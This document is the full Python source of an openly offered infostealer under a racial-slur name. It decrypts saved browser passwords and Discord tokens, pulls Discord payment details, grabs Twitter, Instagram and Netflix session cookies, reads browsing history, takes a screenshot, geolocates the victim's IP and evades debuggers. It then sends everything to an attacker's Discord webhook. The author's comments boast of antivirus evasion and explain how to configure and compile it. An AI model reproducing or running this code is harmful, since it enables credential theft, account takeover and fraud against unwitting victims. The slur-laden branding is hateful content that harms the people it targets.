#well well nigger logger v3
#well well this is pure art created with brain,love and ofc some ai (nobody can stop me from doing this)
#coded by dex/d3xoncpvp
#for support add d3xonv3 on discord
#selling this src or project is prohibited
#might be UD might be NOT it bypassed google and microsoft av when tested and hit a virustotal score of 18/72
#ye thats alot of yapping for a 500line project
#alr imma stop yapping just put youre webhook in the shitty code below (line 88 to be exact) ye and compile with nukita bc pyinstaller sucks
#one last yapping chrome stealing doesnt work bc of new security features

import os
import subprocess
import sys
import sqlite3
import json
import base64
import shutil
import re
import tempfile
import zipfile
import time
import random
from random import choices
from string import ascii_letters, digits
import ctypes
import datetime
import urllib.request
import urllib.parse

try:
    from PIL import ImageGrab
except ImportError:
    print("ERROR: Library 'Pillow' (for PIL.ImageGrab) not found.")
    print("Please install it manually: pip install Pillow")
    sys.exit()

try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ImportError:
    print("ERROR: Library 'discord-webhook' not found.")
    print("Please install it manually: pip install discord-webhook")
    sys.exit()

try:
    import requests
except ImportError:
    print("ERROR: Library 'requests' not found.")
    print("Please install it manually: pip install requests")
    sys.exit()

try:
    from browser_history import get_history
except ImportError:
    print("ERROR: Library 'browser-history' not found.")
    print("Please install it manually: pip install browser-history")
    sys.exit()

try:
    from Cryptodome.Cipher import AES
except ImportError:
    print("ERROR: Library 'pycryptodome' (for Cryptodome.Cipher) not found.")
    print("Please install it manually: pip install pycryptodome")
    sys.exit()

if os.name == 'nt':
    try:
        import win32crypt
    except ImportError:
        print("ERROR: Library 'pywin32' (for win32crypt) not found.")
        print("Please install it manually: pip install pywin32")
        sys.exit()
else:
    win32crypt = None

try:
    from prettytable import PrettyTable
except ImportError:
    print("ERROR: Library 'prettytable' not found.")
    print("Please install it manually: pip install prettytable")
    sys.exit()

try:
    import browser_cookie3
except ImportError:
    print("ERROR: Library 'browser-cookie3' not found.")
    print("Please install it manually: pip install browser-cookie3")
    sys.exit()

CFG_WEBHOOK_URL = "youre shitty webhook here"
CFG_ZIP_NAME_TEMPLATE = "data_{user}.zip"
CFG_EMBED_AUTHOR_NAME = "NIGGER LOGGER"
CFG_WEBHOOK_SENDER_NAME = "NIGGER LOGGER"
CFG_EMBED_THUMBNAIL_URL = "https://media.discordapp.net/attachments/1041392131748679744/1067156726375252090/received_283449976573813.gif?ex=68360ba6&is=6834ba26&hm=81ed582a9ce7a5fd541fedb5f88082a29e6cfb299bd3983a160b4dc90ceca053&"
CFG_COLOR_ORANGE = 0xFFA500

g_roaming_path = os.getenv("APPDATA", "")
g_local_appdata_path = os.getenv("LOCALAPPDATA", "")

DISCORD_API_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
CG_WEBSITE_TARGETS = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]

NEW_TOKEN_PATHS = {
    'Discord': os.path.join(g_roaming_path, 'discord'),
    'Discord Canary': os.path.join(g_roaming_path, 'discordcanary'),
    'Lightcord': os.path.join(g_roaming_path, 'Lightcord'),
    'Discord PTB': os.path.join(g_roaming_path, 'discordptb'),
    'Opera': os.path.join(g_roaming_path, 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(g_roaming_path, 'Opera Software', 'Opera GX Stable'),
    'Amigo': os.path.join(g_local_appdata_path, 'Amigo', 'User Data'),
    'Torch': os.path.join(g_local_appdata_path, 'Torch', 'User Data'),
    'Kometa': os.path.join(g_local_appdata_path, 'Kometa', 'User Data'),
    'Orbitum': os.path.join(g_local_appdata_path, 'Orbitum', 'User Data'),
    'CentBrowser': os.path.join(g_local_appdata_path, 'CentBrowser', 'User Data'),
    '7Star': os.path.join(g_local_appdata_path, '7Star', '7Star', 'User Data'),
    'Sputnik': os.path.join(g_local_appdata_path, 'Sputnik', 'Sputnik', 'User Data'),
    'Vivaldi': os.path.join(g_local_appdata_path, 'Vivaldi', 'User Data'),
    'Chrome SxS': os.path.join(g_local_appdata_path, 'Google', 'Chrome SxS', 'User Data'),
    'Chrome': os.path.join(g_local_appdata_path, "Google", "Chrome", "User Data"),
    'Epic Privacy Browser': os.path.join(g_local_appdata_path, 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': os.path.join(g_local_appdata_path, 'Microsoft', 'Edge', 'User Data'),
    'Uran': os.path.join(g_local_appdata_path, 'uCozMedia', 'Uran', 'User Data'),
    'Yandex': os.path.join(g_local_appdata_path, 'Yandex', 'YandexBrowser', 'User Data'),
    'Brave': os.path.join(g_local_appdata_path, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Iridium': os.path.join(g_local_appdata_path, 'Iridium', 'User Data')
}


def debugger_check_routine():
    if os.name != "nt":
        return False
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent()
    except Exception:
        return False


def get_headers_new(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": DISCORD_API_USER_AGENT
    }
    if token:
        headers["Authorization"] = token
    return headers


def get_key_new(path_to_user_data):
    local_state_path = os.path.join(path_to_user_data, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8', errors='ignore') as f:
            key_b64 = json.load(f).get('os_crypt', {}).get('encrypted_key')
        if key_b64:
            if os.name == 'nt' and win32crypt:
                return base64.b64decode(key_b64)[5:]
            elif os.name != 'nt':
                return None
    except Exception:
        pass
    return None


def get_tokens_new(path_to_user_data_or_profile):
    leveldb_path = os.path.join(path_to_user_data_or_profile, "Local Storage", "leveldb")
    tokens = []
    if not os.path.exists(leveldb_path):
        return tokens
    for file_name in os.listdir(leveldb_path):
        if not (file_name.endswith(".ldb") or file_name.endswith(".log")):
            continue
        try:
            with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    match_dQw4 = re.search(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", line)
                    if match_dQw4:
                        tokens.append(match_dQw4.group(0))
                    for value in re.findall(r"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}", line):
                        tokens.append(value)
        except Exception:
            pass
    return list(set(tokens))


def decrypt_token_new(encrypted_token_str_part, dpapi_key_blob):
    if os.name != 'nt' or not win32crypt:
        return None
    try:
        aes_key = win32crypt.CryptUnprotectData(dpapi_key_blob, None, None, None, 0)[1]
        encrypted_data_bytes = base64.b64decode(encrypted_token_str_part)
        iv = encrypted_data_bytes[3:15]
        payload = encrypted_data_bytes[15:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        decrypted_token = cipher.decrypt(payload)[:-16].decode()
        return decrypted_token
    except Exception:
        return None


def fetch_discord_tokens_new_method():
    if os.name != "nt":
        return []
    processed_tokens_globally = set()
    valid_tokens_with_data = []
    for app_name, base_path in NEW_TOKEN_PATHS.items():
        if not os.path.exists(base_path):
            continue
        key_path_for_app = base_path
        token_search_paths_for_app = [
            os.path.join(base_path, "Local Storage", "leveldb"),
            os.path.join(base_path, "Default", "Local Storage", "leveldb")
        ] + [os.path.join(base_path, f"Profile {i}", "Local Storage", "leveldb") for i in range(1, 4)]

        dpapi_key_blob = get_key_new(key_path_for_app)
        if not dpapi_key_blob:
            continue

        raw_token_candidates_for_app = []
        for token_path_variant in token_search_paths_for_app:
            if os.path.isdir(token_path_variant):
                path_for_gettokens = os.path.dirname(os.path.dirname(token_path_variant))
                raw_token_candidates_for_app.extend(get_tokens_new(path_for_gettokens))
        raw_token_candidates_for_app = list(set(raw_token_candidates_for_app))

        for raw_candidate in raw_token_candidates_for_app:
            token_to_validate = None
            if raw_candidate.startswith("dQw4w9WgXcQ:"):
                encrypted_part = raw_candidate.split("dQw4w9WgXcQ:", 1)[1]
                token_to_validate = decrypt_token_new(encrypted_part, dpapi_key_blob)
            else:
                token_to_validate = raw_candidate

            if token_to_validate and token_to_validate not in processed_tokens_globally:
                processed_tokens_globally.add(token_to_validate)
                try:
                    req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=get_headers_new(token_to_validate))
                    with urllib.request.urlopen(req, timeout=5) as res:  # Added timeout
                        if res.getcode() == 200:
                            res_json = json.loads(res.read().decode())
                            user_data = {
                                "id": res_json.get('id'), "username": res_json.get('username'),
                                "discriminator": res_json.get('discriminator'), "global_name": res_json.get('global_name'),
                                "avatar": res_json.get('avatar'), "email": res_json.get('email'),
                                "phone": res_json.get('phone'), "mfa_enabled": res_json.get('mfa_enabled'),
                                "flags": res_json.get('flags', 0), "locale": res_json.get('locale'),
                                "verified": res_json.get('verified'), "friends_count": 0, "guild_count": 0,
                                "admin_guild_infos": "Not fetched for brevity.", "has_nitro": False, "nitro_expiry": None,
                                "boosts_available": 0, "payment_methods_count": 0,
                                "valid_payment_methods_count": 0, "payment_types": []
                            }
                            if user_data["global_name"]:
                                user_data["username_full"] = user_data["global_name"]
                                if user_data["discriminator"] and user_data["discriminator"] != "0": user_data["username_full"] += f" ({user_data['username']}#{user_data['discriminator']})"
                            elif user_data["username"] and user_data["discriminator"] and user_data["discriminator"] != "0": user_data["username_full"] = f"{user_data['username']}#{user_data['discriminator']}"
                            else: user_data["username_full"] = user_data["username"]
                            if user_data["avatar"] and user_data["id"]: user_data["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                            user_data["badges_str"] = ""
                            if user_data["flags"] & 64 or user_data["flags"] & 96: user_data["badges_str"] += "Bravery "
                            if user_data["flags"] & 128 or user_data["flags"] & 160: user_data["badges_str"] += "Brilliance "
                            if user_data["flags"] & 256 or user_data["flags"] & 288: user_data["badges_str"] += "Balance "
                            try:
                                with urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=get_headers_new(token_to_validate)), timeout=5) as sub_res:
                                    sub_json = json.loads(sub_res.read().decode())
                                    user_data["has_nitro"] = bool(len(sub_json) > 0)
                                    if user_data["has_nitro"]:
                                        user_data["badges_str"] += "Subscriber "
                                        user_data["nitro_expiry"] = datetime.datetime.strptime(sub_json[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y')
                            except: pass
                            try:
                                with urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=get_headers_new(token_to_validate)), timeout=5) as pm_res:
                                    pm_json = json.loads(pm_res.read().decode())
                                    user_data["payment_methods_count"] = len(pm_json)
                                    for pm_item in pm_json:
                                        if not pm_item.get('invalid'): user_data["valid_payment_methods_count"] += 1
                                        if pm_item.get('type') == 1: user_data["payment_types"].append("CC")
                                        elif pm_item.get('type') == 2: user_data["payment_types"].append("PayPal")
                                    user_data["payment_types"] = list(set(user_data["payment_types"]))
                            except: pass
                            valid_tokens_with_data.append((token_to_validate, user_data))
                except: pass
    return valid_tokens_with_data


def get_personal_ip_data():
    ip, country, city, cc = "N/A", "N/A", "N/A", ""
    try:
        ip = requests.get("https://api64.ipify.org", timeout=3).text.strip()
        if ip != "N/A":
            geo = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3).json()
            country, city, cc = geo.get("country_name","N/A"), geo.get("city","N/A"), geo.get("country_code","").lower()
    except: pass
    return ip, country, city, cc


def get_browser_dpapi_key(path):
    lp = os.path.join(path, "Local State")
    if not os.path.exists(lp) or os.name!="nt": return None
    try:
        with open(lp,"r",encoding="utf-8",errors="ignore") as f: ls=json.load(f)
        ek = ls.get("os_crypt",{}).get("encrypted_key")
        if not ek: return None
        if os.name == 'nt' and win32crypt:
            return base64.b64decode(ek)[5:]
    except: return None
    return None


def decrypt_browser_data(blob, key):
    if not key or os.name!="nt" or not win32crypt: return "[NO_KEY_OR_WIN32CRYPT]"
    try: aes_key = win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
    except: return "[FAIL_MASTER_KEY]"
    try:
        iv,pld=blob[3:15],blob[15:]
        c=AES.new(aes_key,AES.MODE_GCM,nonce=iv)
        return c.decrypt(pld)[:-16].decode('utf-8', errors='ignore')
    except:
        try: return win32crypt.CryptUnprotectData(blob,None,None,None,0)[1].decode('utf-8', errors='ignore')
        except: return "[FAIL_DATA]"


def steal_browser_passwords(td):
    if os.name!="nt": return None
    all_pwd=[]
    bp = {
        "Chrome": os.path.join(g_local_appdata_path,"Google","Chrome","User Data"),
        "Edge": os.path.join(g_local_appdata_path,"Microsoft","Edge","User Data"),
        "Brave": os.path.join(g_local_appdata_path,"BraveSoftware","Brave-Browser","User Data"),
        "Opera": os.path.join(g_roaming_path,"Opera Software","Opera Stable"),
        "GX": os.path.join(g_roaming_path,"Opera Software","Opera GX Stable"),
        "Vivaldi": os.path.join(g_local_appdata_path,"Vivaldi","User Data")
    }
    for bn,bpath in bp.items():
        if not os.path.exists(bpath): continue
        key=get_browser_dpapi_key(bpath)
        if not key: continue
        prf=["Default"]+[f"Profile {i}" for i in range(1,4)]
        for pf in prf:
            ldb=os.path.join(bpath,pf,"Login Data")
            ldb_base=os.path.join(bpath,"Login Data")
            adb=None
            if os.path.exists(ldb): adb=ldb
            elif pf=="Default" and os.path.exists(ldb_base): adb=ldb_base
            if not adb: continue
            tmp=os.path.join(td,f"{bn}_{pf}_{''.join(choices(ascii_letters,k=3))}.db")
            conn=None
            try:
                shutil.copyfile(adb,tmp)
                conn=sqlite3.connect(tmp)
                cur=conn.cursor()
                cur.execute("SELECT origin_url,username_value,password_value FROM logins")
                for u,usr,ep in cur.fetchall():
                    if usr and ep:
                        dp=decrypt_browser_data(ep,key)
                        if dp and "[FAIL" not in dp and "[NO_KEY" not in dp : all_pwd.append([bn,pf,usr,dp,u or "N/A"])
                cur.close()
            except: pass
            finally:
                if conn: conn.close()
                if os.path.exists(tmp):
                    try:os.remove(tmp)
                    except:pass
    return all_pwd if all_pwd else None


def format_and_save_history(td):
    ht=PrettyTable()
    ht.field_names=["Timestamp","URL","Browser"]
    found=False
    try:
        ho=get_history()
        for e in ho.histories[:200]:
            if not e or len(e) < 2: continue
            et,eu=e[0],e[1]
            bn=e[2] if len(e)>2 else "N/A"
            u=eu[:117]+"..." if len(eu)>120 else eu
            ts=et.strftime('%y-%m-%d %H:%M') if hasattr(et,'strftime') else str(et)[:16]
            ht.add_row([ts,u,bn]); found=True
    except Exception:
        ht.add_row(["ERR","Could not retrieve history","N/A"])
        found = True
    hc=ht.get_string() if found else "No browser history found."
    with open(os.path.join(td,"Browser History.txt"),"w",encoding="utf-8") as f:f.write(hc)


def grab_specific_cookies(td):
    tw_t,in_s,nf_c=[],[],[]
    for site in CG_WEBSITE_TARGETS:
        csb=[]
        bfs=[browser_cookie3.chrome,browser_cookie3.edge,browser_cookie3.firefox,
             browser_cookie3.brave,browser_cookie3.opera,browser_cookie3.vivaldi]
        for bf in bfs:
            try:
                cj=bf(domain_name=site)
                if cj:
                    csp=[f"{c.name}={c.value}" for c in cj]
                    if csp:csb.append("; ".join(csp))
            except:pass
        for scs in csb:
            if site=="twitter.com":
                m=re.findall(r'auth_token=([a-zA-Z0-9%_-]+)',scs)
                for t in m:
                    if len(t)>30 and t not in tw_t:tw_t.append(t)
            elif site=="instagram.com":
                du=re.search(r'ds_user_id=([^;]+)',scs)
                si=re.search(r'sessionid=([^;]+)',scs)
                if du and si:
                    st=(du.group(1),si.group(1))
                    if st not in in_s:in_s.append(st)
            elif site=="netflix.com":
                if "NetflixId=" in scs:
                    cnc=[]
                    rcp=scs.split(';')
                    for p in rcp:
                        p=p.strip()
                        if '=' in p: n,v=p.split('=',1);cnc.append({"domain":site,"name":n,"value":v})
                    if cnc:nf_c.append(cnc)
    if tw_t:
        tt=PrettyTable();tt.field_names=["Twitter Auth Tokens"]
        for t in tw_t:tt.add_row([t])
        with open(os.path.join(td,"Twitter Tokens.txt"),"w",encoding="utf-8") as f:f.write(tt.get_string())
    if in_s:
        it=PrettyTable();it.field_names=["DS_User_ID","SessionID"]
        for s in in_s:it.add_row(list(s))
        with open(os.path.join(td,"Instagram Sessions.txt"),"w",encoding="utf-8") as f:f.write(it.get_string())
    for i,ns in enumerate(nf_c):
        with open(os.path.join(td,f"Netflix_S{i+1}.json"),"w",encoding="utf-8") as f:json.dump(ns,f,indent=2)
    return tw_t,in_s,nf_c


def capture_screenshot(sd):
    sbn=f"Screen_{''.join(choices(digits,k=4))}.png"
    tfp=os.path.join(sd,sbn)
    try: ImageGrab.grab(all_screens=True).save(tfp); return tfp,sbn
    except: return None,None


def format_and_save_discord_info(td,tk_data):
    mt=PrettyTable()
    mt.field_names=["#","Token","User","Email","Phone","Nitro?","Badges"]
    di="--- Detailed Discord Information ---\n\n"
    if not tk_data: di+="No valid Discord tokens found.\n"
    else:
        for i,(t,d) in enumerate(tk_data):
            mt.add_row([i+1,t,d.get("username_full","N/A"),d.get("email","N/A"),
                        d.get("phone","N/A"),"Yes" if d.get("has_nitro") else "No",
                        d.get("badges_str","N/A")])
            if i==0:
                di+=f"Primary Token (User: {d.get('username_full','N/A')}):\n"
                relevant_keys = ["id", "mfa_enabled", "locale", "verified", "friends_count", "guild_count",
                                 "has_nitro", "nitro_expiry", "boosts_available",
                                 "payment_methods_count", "valid_payment_methods_count", "payment_types"]
                for key_item in relevant_keys:
                    di+=f"  {key_item.replace('_',' ').title()}: {d.get(key_item, 'N/A')}\n"
                di+="\n"
    fo=mt.get_string()+"\n\n"+di
    with open(os.path.join(td,"Discord Info.txt"),"w",encoding="utf-8") as f:f.write(fo)


def send_summary_webhook(wurl,pprofile,counts,ninfo,sspath,ssname,zipath):
    if not wurl or wurl == "YOUR_WEBHOOK_URL_HERE" or "discord.com/api/webhooks" not in wurl :
        print("[!] Webhook invalid/missing or placeholder. Dispatch aborted.")
        return

    wh=DiscordWebhook(url=wurl,username=CFG_WEBHOOK_SENDER_NAME)
    if CFG_EMBED_THUMBNAIL_URL and CFG_EMBED_THUMBNAIL_URL.startswith("http"):wh.avatar_url=CFG_EMBED_THUMBNAIL_URL
    vname=pprofile.get('username_full','Unknown')
    if vname=="N/A":vname="Unknown"
    et=f"Data: {vname}"
    emb=DiscordEmbed(title=et[:256],color=CFG_COLOR_ORANGE)
    emb.set_author(name=CFG_EMBED_AUTHOR_NAME,icon_url=pprofile.get("avatar_url") or CFG_EMBED_THUMBNAIL_URL)
    emb.set_footer(text=f"By {CFG_EMBED_AUTHOR_NAME}");emb.set_timestamp()
    niv=(f":eyes:`IP:` **{ninfo.get('ip','N/A')}**\n"
         f":golf:`Country:` **{ninfo.get('country','N/A')}**"
         f"{' :flag_'+ninfo.get('country_code','')+':' if ninfo.get('country_code') else ''}\n"
         f":cityscape:`City:` **{ninfo.get('city','N/A')}**")
    emb.add_embed_field(name="NETWORK INFO",value=niv,inline=False)
    av=(f":speech_balloon:`Discord:` **{counts.get('discord_tokens',0)}**\n"
        f":bird:`Twitter:` **{counts.get('twitter_tokens',0)}**\n"
        f":camera:`Instagram:` **{counts.get('instagram_sessions',0)}**\n"
        f":tv:`Netflix:` **{counts.get('netflix_sessions',0)}**\n"
        f":key:`Passwords:` **{counts.get('browser_passwords',0)}**")
    emb.add_embed_field(name="ACCOUNTS",value=av,inline=False)
    pv=(f":credit_card:`Payments (Discord):` **{counts.get('discord_payment_methods',0)} "
        f"(Valid: {counts.get('discord_valid_payment_methods',0)})**\n"
        f":id:`Types (Discord):` `{', '.join(counts.get('discord_payment_types',['N/A']))}`")
    emb.add_embed_field(name="PAYMENT INFO (Discord)",value=pv,inline=False)
    pt=counts.get("primary_discord_token_value")
    if pt:emb.add_embed_field(name="Primary Token",value=f"```{pt}```",inline=False)
    if sspath and ssname:
        try:
            with open(sspath,"rb") as f:wh.add_file(file=f.read(),filename=ssname)
            emb.set_image(url=f"attachment://{ssname}")
        except:pass
    wh.add_embed(emb)
    if zipath and os.path.exists(zipath):
        try:
            with open(zipath,"rb") as f:wh.add_file(file=f.read(),filename=os.path.basename(zipath))
        except:pass
    try: wh.execute();print("[+] Report sent.")
    except Exception as e:print(f"[!] Webhook send fail: {e}")


def run_main_logic():
    if os.name=="nt" and debugger_check_routine():print("[!] Debugger. Exit.");return
    puz=os.getenv('UserName','User').replace(" ","_") if os.name=="nt" else "User"
    czn=CFG_ZIP_NAME_TEMPLATE.format(user=puz)
    tdo=tempfile.TemporaryDirectory(prefix="data_")
    td=tdo.name
    ssp,ssn=capture_screenshot(td)
    ip,co,ci,cc=get_personal_ip_data()
    nic={"ip":ip,"country":co,"city":ci,"country_code":cc}
    bpl=steal_browser_passwords(td)

    pass_file_path = os.path.join(td, "Passwords.txt") 
    if bpl:
        with open(pass_file_path, "w", encoding="utf-8") as f:
            pt = PrettyTable(); pt.field_names = ["Browser", "Profile", "User", "Pass", "URL"]
            for e in bpl: pt.add_row(e)
            f.write(pt.get_string())
    else:
        with open(pass_file_path, "w", encoding="utf-8") as f:
            f.write("No browser passwords found.")


    dtd=fetch_discord_tokens_new_method()
    format_and_save_discord_info(td,dtd)
    pup=dtd[0][1] if dtd else {"username_full":"N/A"}
    ptv=dtd[0][0] if dtd else None
    ftt,fis,fns=grab_specific_cookies(td)
    format_and_save_history(td)
    cnts={
        "discord_tokens":len(dtd),"primary_discord_token_value":ptv,
        "twitter_tokens":len(ftt),"instagram_sessions":len(fis),
        "netflix_sessions":len(fns),"browser_passwords":len(bpl) if bpl else 0,
        "discord_payment_methods":pup.get('payment_methods_count',0),
        "discord_valid_payment_methods":pup.get('valid_payment_methods_count',0),
        "discord_payment_types":pup.get('payment_types',[])
    }
    zalp=os.path.join(td,czn);zcok=False
    try:
        with zipfile.ZipFile(zalp,'w',zipfile.ZIP_DEFLATED) as zf:
            for r,_,fs in os.walk(td):
                for fi in fs:
                    if fi==czn:continue
                    ptf=os.path.join(r,fi)
                    zf.write(ptf,os.path.relpath(ptf,td))
        zcok=True
    except Exception as e:print(f"[!] ZIP Error: {e}")
    
    current_webhook_url = CFG_WEBHOOK_URL 

    if not current_webhook_url or current_webhook_url == "YOUR_WEBHOOK_URL_HERE" or "discord.com/api/webhooks" not in current_webhook_url:
        print("[CRITICAL] Webhook URL is invalid or placeholder. Report not sent.")
    else:
        send_summary_webhook(current_webhook_url,pup,cnts,nic,ssp,ssn,zalp if zcok else None)
    try: tdo.cleanup()
    except:pass

if __name__=="__main__": 
    if os.name=="nt": 
        try:
            import win32crypt
            from Crypto.Cipher import AES
        except ImportError:
            print("ERROR: Critical libraries (pywin32 or pycryptodome) seem to be missing or not importable even after install attempt.")
            print("Please ensure they are correctly installed in your Python environment.")
            print("Try: pip install pywin32 pycryptodome")
    if CFG_WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE" or not CFG_WEBHOOK_URL or "discord.com/api/webhooks" not in CFG_WEBHOOK_URL:
         print("[CRITICAL] Webhook URL is a placeholder or invalid in config.")
    else:
        run_main_logic()